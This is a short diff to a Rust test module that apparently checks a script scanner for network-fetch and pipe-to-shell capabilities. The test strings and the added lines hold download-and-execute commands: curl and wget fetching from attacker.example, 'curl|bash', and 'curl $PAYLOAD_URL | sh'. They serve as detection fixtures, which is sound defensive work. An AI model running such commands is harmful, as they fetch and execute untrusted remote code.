@@ -661,6 +661,7 @@ mod tests {
             "curl\thttps://attacker.example/tool.sh\n",
             "wget\thttps://attacker.example/tool.sh\n",
             "curl|bash\n",
+            "exec('curl\t$PAYLOAD_URL | sh')\n",
         ] {
             let caps = script_capabilities(content);
             assert!(
@@ -684,6 +685,7 @@ mod tests {
         for content in [
             "mycurl\thttps://attacker.example/tool.sh\n",
             "awget\thttps://attacker.example/tool.sh\n",
+            "exec('mycurl\t$PAYLOAD_URL')\n",
         ] {
             let links = script_relations(content);
             assert!(
